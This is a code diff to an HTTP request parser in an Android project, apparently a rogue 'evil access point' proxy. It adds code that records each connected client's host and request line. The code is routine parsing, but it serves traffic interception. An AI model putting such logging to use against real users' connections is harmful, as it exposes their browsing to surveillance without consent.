@@ -3,6 +3,9 @@ package com.nibiru.evil_ap.proxy;
 import android.support.v4.util.Pair;
 import android.util.Log;
 
+import com.nibiru.evil_ap.SharedClass;
+import com.nibiru.evil_ap.log.Client;
+
 import java.io.BufferedReader;
 import java.io.StringReader;
 import java.util.Vector;
@@ -17,17 +20,18 @@ class OkHttpParser {
     /**************************************CLASS FIELDS********************************************/
     protected final String TAG = getClass().getSimpleName();
     private Vector<Pair<String,String>> requestHeaders;
+    private String requestLine;
     private StringBuffer messageBody;
     /**************************************CLASS METHODS*******************************************/
     OkHttpParser(){
         requestHeaders = new Vector<>();
         messageBody = new StringBuffer();
     }
-    Request parse(String request){
+    Request parse(String request, SharedClass shrObj, Client c){
         BufferedReader reader = new BufferedReader(new StringReader(request));
         try {
             //read request line
-            String requestLine = reader.readLine(); // Request-Line ; Section 5.1
+            requestLine = reader.readLine(); // Request-Line ; Section 5.1
             //read header
             String header = reader.readLine();
             while (header != null && header.length() > 0) {
@@ -45,7 +49,7 @@ class OkHttpParser {
                 appendMessageBody(bodyLine);
                 bodyLine = reader.readLine();
             }
-            return buildOkHTTPRequest(requestLine);
+            return buildOkHTTPRequest(requestLine, shrObj, c);
 
         } catch (Exception e) {
             Log.d(TAG, "Unable to parse request");
@@ -67,15 +71,18 @@ class OkHttpParser {
         messageBody.append(bodyLine).append("\r\n");
     }
 
-    private Request buildOkHTTPRequest(String requestLine) {
+    private Request buildOkHTTPRequest(String requestLine, SharedClass shrObj, Client c) {
         String[] requestLineValues = requestLine.split("\\s+");
         String url = "";
         Request.Builder builder = new Request.Builder();
         for(Pair<String, String> header : requestHeaders){
             if (header.first.equals("Host") || header.first.equals("host")){
-                url = "http://" + header.second.trim() + requestLineValues[1];
+                String host = header.second.trim();
+                url = "http://" + host + requestLineValues[1];
                 Log.d(TAG, url);
                 builder.url(url);
+                //TODO: testing logging
+                shrObj.addRequest(c, host, requestLine);
             }
             else builder.addHeader(header.first, header.second);
         }
